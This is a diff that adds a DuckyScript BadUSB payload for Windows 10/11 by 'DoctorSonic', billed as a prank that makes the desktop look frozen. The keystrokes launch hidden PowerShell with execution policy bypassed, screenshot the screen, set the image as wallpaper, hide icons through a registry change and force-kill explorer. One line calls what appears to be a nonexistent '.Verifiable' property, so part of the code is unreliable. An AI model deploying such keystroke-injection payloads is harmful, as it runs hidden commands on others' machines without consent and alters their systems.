@@ -1,0 +1,23 @@
+\
+REM Title: Frozen Desktop Illusion
+REM Description: Takes a screenshot, sets it as wallpaper, hides icons — desktop looks frozen
+REM Target OS: Windows 10/11
+REM Author: DoctorSonic
+
+DELAY 1000
+GUI r
+DELAY 600
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+ENTER
+DELAY 1200
+STRING Add-Type -Assembly System.Windows.Forms; $s=[System.Windows.Forms.Screen]::PrimaryScreen; $bmp=New-Object System.Drawing.Bitmap($s.Bounds.Width,$s.Bounds.Height); $g=[System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($s.Bounds.Location,[System.Drawing.Point]::Empty,$s.Bounds.Size); $bmp.Save("$env:TEMP\desktop.png"); $bmp.Dispose()
+ENTER
+DELAY 1500
+STRING $wp="$env:TEMP\desktop.png"; Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class WP{[DllImport("user32.dll")]public static extern int SystemParametersInfo(int uA,int uP,string lpvP,int fWI);}'; [WP]::SystemParametersInfo(20,0,$wp,3)
+ENTER
+DELAY 1000
+STRING $sh=New-Object -Com Shell.Application; $sh.NameSpace('shell:::{3080F90D-D7AD-11D9-BD98-0000947B0257}').Self.Verifiable; Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name HideIcons -Value 1; Stop-Process -Name explorer -Force
+ENTER
+DELAY 1500
+STRING exit
+ENTER
